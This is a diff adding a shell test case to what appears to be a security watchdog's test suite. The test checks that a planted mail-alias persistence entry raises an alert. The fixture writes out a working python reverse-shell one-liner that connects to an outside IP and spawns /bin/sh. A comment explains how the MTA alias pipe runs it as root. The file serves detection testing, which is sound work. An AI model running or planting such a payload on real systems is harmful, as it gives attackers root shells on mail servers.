@@ -298,3 +298,21 @@ seed_benign() {
     run_wd
     cap | grep -qE '"severity":"(alert|warn)"'
 }
+
+@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on aliases pipe surface)" {
+    # Sister to nc / bash / curl|bash / base64 / dev-tcp pipe rev-
+    # shell variants already locked. Attackers reach for python -c
+    # 'import socket,os,pty' to dodge shell-pattern detectors —
+    # python is on every Debian/Ubuntu MTA host. Locks the python
+    # interpreter axis on the mail-delivery-triggered root-exec
+    # persistence surface (T1546 — MTA delivers self-addressed mail
+    # to alias pipe-target by exec'ing the command AS ROOT on every
+    # matching message; attacker sends self-addressed mail to
+    # trigger planted python rev-shell).
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf 'evil: |python -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);pty.spawn(\\"/bin/sh\\")"\n' > "${ALIASES}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
